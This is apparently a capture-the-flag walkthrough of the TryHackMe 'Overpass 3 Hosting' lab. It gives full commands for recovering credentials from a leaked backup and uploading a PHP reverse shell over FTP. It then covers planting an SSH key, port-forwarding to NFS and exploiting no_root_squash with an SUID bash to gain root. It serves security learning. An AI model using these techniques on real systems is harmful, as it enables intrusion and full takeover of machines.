# Overpass 3 Hosting

**Date:** 20, May, 2021

**Author:** Dhilip Sanjay S

---

[Click Here](https://tryhackme.com/room/overpass3hosting) to go to the TryHackMe room.

## Enumeration

### Nmap

```bash
$ nmap -sC -sV -p- 10.10.213.153 -oN nmap-out
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 22:22 IST
Nmap scan report for 10.10.213.153
Host is up (0.19s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Overpass Hosting
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 587.16 seconds
```

### Gobuster

```bash
$ gobuster dir -u http://10.10.213.153 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.213.153
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,js,css,html,cgi
[+] Timeout:                 10s
===============================================================
2021/05/20 22:24:27 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/backups              (Status: 301) [Size: 237] [--> http://10.10.213.153/backups/]
/cgi-bin/.html        (Status: 403) [Size: 222]                                    
/cgi-bin/             (Status: 403) [Size: 217]
/index.html           (Status: 200) [Size: 1770]                                   
/main.css             (Status: 200) [Size: 576]                                    
                                                                                   
===============================================================
2021/05/20 22:34:44 Finished
===============================================================

```

![Overpass 3 - Hosting](Images/overpass3-port80.png)

---

## Analysing backup.zip

```bash
$ wget http://10.10.213.153/backups/backup.zip
--2021-05-20 22:27:14--  http://10.10.213.153/backups/backup.zip
Connecting to 10.10.213.153:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13353 (13K) [application/zip]
Saving to: ‘backup.zip’

backup.zip                  100%[===========================================>]  13.04K  66.3KB/s    in 0.2s    

2021-05-20 22:27:14 (66.3 KB/s) - ‘backup.zip’ saved [13353/13353]

$ unzip backup.zip 
Archive:  backup.zip
 extracting: CustomerDetails.xlsx.gpg  
  inflating: priv.key

$ file *
CustomerDetails.xlsx.gpg: PGP RSA encrypted session key - keyid: 9E86A1C6 3FB96335 RSA (Encrypt or Sign) 2048b .
priv.key:                 PGP private key block               
```

- Decrypting the `CustomerDetails.xlsx.gpg` file using the `priv.key`:

```bash
$ gpg --import priv.key 
gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

$ gpg -d CustomerDetails.xlsx.gpg > CustomerDetails.xlsx
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"

$ file CustomerDetails.xlsx
CustomerDetails.xlsx: Microsoft Excel 2007+
```

- By opening the file using excel, we get the password of few accounts:

![CustomerDetails.xlsx](Images/overpass3-excel.png)

---

## Login into FTP

- By using the passwords recently found, we can try to login into to ftp server.
- **P.S:** The passwords didn't work for `ssh`.

### Login as paradox

- (Other two accounts didn't work.)

```bash
$ ftp 10.10.213.153
Connected to 10.10.213.153.
220 (vsFTPd 3.0.3)
Name (10.10.213.153:root): paradox
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
-rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
-rw-r--r--    1 0        0             576 Nov 17  2020 main.css
-rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
226 Directory send OK.

ftp> cd backups
250 Directory successfully changed.

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 48       48             24 Nov 08  2020 .
drwxrwxrwx    3 48       48             94 Nov 17  2020 ..
-rw-r--r--    1 48       48          13353 Nov 08  2020 backup.zip
226 Directory send OK.

ftp> pwd
257 "/" is the current directory
```

- The files in this folder seems to be the **web directory**.
- If we upload anything to this folder, then we can access it in the browser!
- May be we should upload **reverse-shell.php** to this folder. 
- **P.S:** Make sure to change the IP address and port number.

```bash
ftp> put php-reverse-shell.php reverse-shell.php
local: php-reverse-shell.php remote: reverse-shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5492 bytes sent in 0.00 secs (29.5908 MB/s)
```

---

## Initial shell

- Listen on the appropriate port using `netcat`.
- Visit `http://10.10.213.153/reverse-shell.php` on the browser to get a reverse shell.

```bash
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.7.91] from (UNKNOWN) [10.10.213.153] 44754
Linux localhost.localdomain 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 18:32:57 up 45 min,  0 users,  load average: 0.00, 0.00, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (858): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ whoami
whoami
apache
```

- Upgrade the reverse shell:

```bash
sh-4.4$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
bash-4.4$ ^Z
[1]+  Stopped                 nc -lvnp 1234

$ stty raw -echo; fg
nc -lvnp 1234

bash-4.4$ export term=XTERM
bash-4.4$            
```

---

## Web Flag

```bash
bash-4.4$ cd
bash-4.4$ ls
error  icons  noindex  web.flag

bash-4.4$ hostname && whoami && cat web.flag
localhost.localdomain
apache
thm{REDACTED}
```

---

## Privilege Escalation (Apache to Paradox)

- Try to switch to paradox user using the same password as that of ftp.

```bash
bash-4.4$ whoami
apache

bash-4.4$ su paradox
Password: 

[paradox@localhost home]$ whoami
paradox
```

---

## Running Linpeas

- After running linpeas, we find the privilege escalation vector:

```bash
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```

- But the port 2049 is not open on the victim machine. We get the following errors:

```bash
$ rpcinfo -p 10.10.213.153
10.10.213.153: RPC: Remote system error - No route to host

$ showmount -e 10.10.213.153
clnt_create: RPC: Unable to receive
```

- Hence we must do port forwarding to exploit **no_root_squash**. (I didn't know how to proceed furher, so read a walkthrough to learn more about port forwarding.)
- You can use **SSH** or **Chisel** for port forwarding.

--- 

## SSH Port forwarding
- Added ssh public key to the `.ssh/authorized_keys` file of **paradox** user.

```bash
[paradox@localhost ~]$ cd .ssh/

[paradox@localhost .ssh]$ ls
authorized_keys  id_rsa.pub

[paradox@localhost .ssh]$ echo "PUBLIC KEY" >> authorized_keys 
[paradox@localhost .ssh]$ cat authorized_keys 

PUBLIC KEYS
```

- Check if you can login using the **private key**:

```bash
$ ssh -i ~/.ssh/id_rsa paradox@10.10.213.153
Last login: Thu May 20 19:45:53 2021

[paradox@localhost ~]$ whoami
paradox
```

- Run **port forwarding** using ssh:

```bash
$ ssh -i ~/.ssh/id_rsa paradox@10.10.213.153 -L 2049:localhost:2049
Last login: Thu May 20 19:56:29 2021 from 10.17.7.91

[paradox@localhost ~]$ rpcinfo -p
program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp  44352  status
    100024    1   tcp  54469  status
    100005    1   udp  20048  mountd
    100005    1   tcp  20048  mountd
    100005    2   udp  20048  mountd
    100005    2   tcp  20048  mountd
    100005    3   udp  20048  mountd
    100005    3   tcp  20048  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  37043  nlockmgr
    100021    3   udp  37043  nlockmgr
    100021    4   udp  37043  nlockmgr
    100021    1   tcp  33041  nlockmgr
    100021    3   tcp  33041  nlockmgr
    100021    4   tcp  33041  nlockmgr
```

- Don't close the ssh session with port forwarding, until you want to access the NFS.

--- 

## User Flag

- Mount the NFS to the attacker machine.
- Now we have **read, write** permission inside that NFS.

```bash
root@kali:# mount -t nfs localhost:/ /mnt/jamesNFS/

root@kali:# cd /mnt/jamesNFS/

root@kali:/mnt/jamesNFS# ls
user.flag

root@kali:/mnt/jamesNFS# cat user.flag 
thm{REDACTED}
```

## Privilege Escalation (James to Root)

### Private SSH key

- We have the **private key of James** in the NFS.
- We'll copy it to the attacker machine, so that we can login as james using ssh.

```bash
root@kali:/mnt/jamesNFS# cat .ssh/
authorized_keys  id_rsa           id_rsa.pub       

root@kali:/mnt/jamesNFS# cat .ssh/authorized_keys 

root@kali:/mnt/jamesNFS# cat .ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
REDACTED
-----END OPENSSH PRIVATE KEY-----

root@kali:/mnt/jamesNFS# cp .ssh/id_rsa ~/Desktop/CTF/TryHackMe/overpass3-hosting
```

### Bash binary with SUID

- We need to find a way for privilege escalation.
- Reading more about **no_root_squash**: This option basically gives authority to the root user on the client to access files on the NFS server as **root**. And this can lead to serious security implications.
- So, we'll copy `/bin/bash` into the NFS and set **SUID bit**:

```bash
root@kali:/mnt/jamesNFS# cp /bin/bash .

root@kali:/mnt/jamesNFS# chmod +s bash

root@kali:/mnt/jamesNFS# ls -la
total 1228
drwx------ 3 ds   ds       124 May 21 00:38 .
drwxr-xr-x 4 root root    4096 May 20 23:34 ..
-rwsr-sr-x 1 root root 1234376 May 21 00:38 bash
lrwxrwxrwx 1 root root       9 Nov  9  2020 .bash_history -> /dev/null
-rw-r--r-- 1 ds   ds        18 Nov  8  2019 .bash_logout
-rw-r--r-- 1 ds   ds       141 Nov  8  2019 .bash_profile
-rw-r--r-- 1 ds   ds       312 Nov  8  2019 .bashrc
drwx------ 2 ds   ds        61 Nov  8  2020 .ssh
-rw------- 1 ds   ds        38 Nov 18  2020 user.flag
```

### SSH login & Priv Esc

```bash
$ ssh -i james_idrsa james@10.10.213.153

Last failed login: Thu May 20 19:02:18 BST 2021 on pts/0
There were 5 failed login attempts since the last successful login.
Last login: Wed Nov 18 18:26:00 2020 from 192.168.170.145

[james@localhost ~]$ whoami
james

[james@localhost ~]$ ls
bash  user.flag

[james@localhost ~]$ hostname && whoami && cat user.flag 
localhost.localdomain
james
thm{REDACTED}

[james@localhost ~]$ ./bash -p
./bash: /lib64/libtinfo.so.6: no version information available (required by ./bash)
bash-5.1# whoami
root
```

---

## Root Flag

```bash
bash-5.1# cd /root/

bash-5.1# ls 
root.flag

bash-5.1# hostname && whoami && cat root.flag 
localhost.localdomain
root
thm{REDACTED}
```

---

## References
- [HackTricks - NFS no_root_squash](https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)
- [Port Forward/SSH Tunneling](https://guide.offsecnewbie.com/port-forwarding-ssh-tunneling)
- [Chisel](https://github.com/jpillora/chisel)